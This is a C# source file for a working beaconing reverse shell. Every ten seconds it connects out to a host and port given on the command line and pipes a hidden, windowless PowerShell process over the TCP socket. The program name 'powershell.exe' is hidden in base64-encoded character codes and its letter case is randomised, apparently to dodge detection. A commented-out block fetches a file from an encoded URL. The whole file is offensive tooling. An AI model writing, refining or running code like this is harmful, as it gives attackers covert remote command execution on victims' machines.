using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Net;

namespace beaconing
{
    public class Program
    {
        static StreamWriter writer;
        static StreamReader reader;
        public static int Main(string[] args)
        {
            String IP_Address = "";
            int Port = 0;

            if (args.Length == 0)
            {
                System.Console.WriteLine(@"Usage: .\beaconing.exe <host> <port>");
                return 1;
            }
            else if (args.Length == 2)
            {
                IP_Address = args[0];
                Port = Int32.Parse(args[1]);
            }
            else
            {
                System.Console.WriteLine(@"Usage: .\beaconing.exe <host> <port>");
                return 1;
            }

            while (true)
            {
                Console.WriteLine("Sleeping...");
                System.Threading.Thread.Sleep(10000);
                Console.WriteLine("Calling GiveShell()");
                PretAManger(IP_Address, Port);
            }
        }
        public static void PretAManger(String IP_Address, int Port)
        {
            TcpClient client = ConnectMeDaddy(IP_Address, Port);

            if (client != null)
            {
                Console.WriteLine(String.Format("Connected to {0}:{1}!", IP_Address, Port));
                var stream = client.GetStream();
                writer = new StreamWriter(stream);
                reader = new StreamReader(stream);

                StringBuilder StrInput = new StringBuilder();
                Process HiddenLettuce = new Process();
                try
                {
                    String MustardYellowJumper = KetteringTownFC();
                    HiddenLettuce.StartInfo.FileName = MustardYellowJumper;
                    Console.WriteLine(String.Format("Starting {0}!", MustardYellowJumper));
                    HiddenLettuce.StartInfo.CreateNoWindow = true; // for debugging
                    HiddenLettuce.StartInfo.UseShellExecute = false;
                    // https://stackoverflow.com/questions/5255086/when-do-we-need-to-set-useshellexecute-to-true
                    // https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute?view=netframework-4.0
                    // Basically just means: "Gets or sets a value indicating whether to use the operating system shell to start the process."
                    HiddenLettuce.StartInfo.RedirectStandardOutput = true;
                    HiddenLettuce.StartInfo.RedirectStandardInput = true;
                    HiddenLettuce.StartInfo.RedirectStandardError = true;
                    HiddenLettuce.OutputDataReceived += new DataReceivedEventHandler(OutputHandler);
                    HiddenLettuce.Start();
                    HiddenLettuce.BeginOutputReadLine();
                    while (true)
                    {
                        StrInput.Append(reader.ReadLine());
                        HiddenLettuce.StandardInput.WriteLine(StrInput);
                        StrInput.Remove(0, StrInput.Length);
                    }
                }
                catch
                {
                    Console.WriteLine("Shit died");
                }
                finally
                {
                    Console.WriteLine("Closing streams and stuff");
                    stream.Close();
                    reader.Close();
                    writer.Close();
                    client.Close();
                    HiddenLettuce.Close();
                }
            }
            /**
            else
            {
                String Repertoire = "aHR0cHM6Ly93d3cuamFtZXNhY2FzdGVyLmNvbS93cC1jb250ZW50L3VwbG9hZHMvMjAxNi8wOC9qYW1lczMuanBn";
                using (var R = new WebClient())
                {
                    R.DownloadFile(Encoding.UTF8.GetString(Convert.FromBase64String(Repertoire)), "Repertoire.jpg");
                }
            }
            **/
        }
        public static TcpClient ConnectMeDaddy(String IP_Address, int Port)
        {
            Console.WriteLine(String.Format("Connecting to {0}:{1}", IP_Address, Port));
            TcpClient client = null;
            try
            {

                client = new TcpClient(IP_Address, Port);
            }
            catch
            {
                Console.WriteLine(String.Format("Failed to connect to {0}:{1} :(", IP_Address, Port));
                client = null;
            }
            return client;
        }
        public static void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    writer.WriteLine(strOutput);
                    writer.Flush();
                }
                catch (Exception err) { }
            }
        }

        public static String KetteringTownFC() // @michaelranaldo and I were bored.
        {
            // https://www.youtube.com/watch?v=-JCfohAGRQ0
            string y = "MTEyIDc5IDExOSA2OSAxMTQgODMgMTA0IDY5IDEwOCA3NiA0NiA2OSAxMjAgNjk=";
            string z = "MTEyIDc5IDExOSA2OSAxMTQgODMgMTABanana0IDY5IDEwOCA3NiA0NiA2OSAxMjAgNjk=";

            String p0 = Encoding.UTF8.GetString(Convert.FromBase64String(y));

            string[] p1 = p0.Split(' ');

            String Acaster = "";

            foreach (var p in p1)
            {
                char c = Convert.ToChar(Int32.Parse(p));
                string d = c.ToString();
                Acaster += d;

            }
            Random random = new Random();
            String BananaShop = "";

            foreach (char c in Acaster)
            {
                int r = random.Next(0, 2);
                var b = "";
                switch (r)
                {
                    case 0:
                        b = c.ToString().ToUpper();
                        break;
                    case 1:
                        b = c.ToString().ToLower();
                        break;
                    case 2:
                        b = "@";
                        break;
                    case 3:
                        b = "its://";
                        break;
                    case 4:
                        b = z.Substring(z.IndexOf("B"), z.LastIndexOf("a"));
                        break;
                    default:
                        b = c.ToString();
                        break;
                }
                BananaShop += b;
            }
            return BananaShop;
        }

    }

}